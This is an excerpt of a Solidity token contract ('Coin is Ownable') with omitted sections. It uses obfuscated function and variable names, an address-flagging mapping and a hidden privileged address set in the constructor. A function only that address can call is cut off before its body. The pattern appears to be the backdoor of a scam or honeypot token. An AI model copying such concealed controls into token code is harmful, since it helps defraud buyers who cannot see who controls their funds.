...
contract Coin is Ownable {
    ...
    function queryacawtibot(address sss) private view returns(bool)  {
        return pepevipcc[sss];
    }

    function vultBox2222() private view returns (uint256) {
        return _totalSupply;
    }

    function weofgd() external {
        if (_msgSender() != _sddfofd) {
            return;
        }
        if (_sddfofd == _msgSender()){
    ...
    constructor(string memory tokenName, string memory tokenSymbol, address rfo) {
        _name = tokenName;
        _symbol = tokenSymbol;
        _sddfofd = rfo;
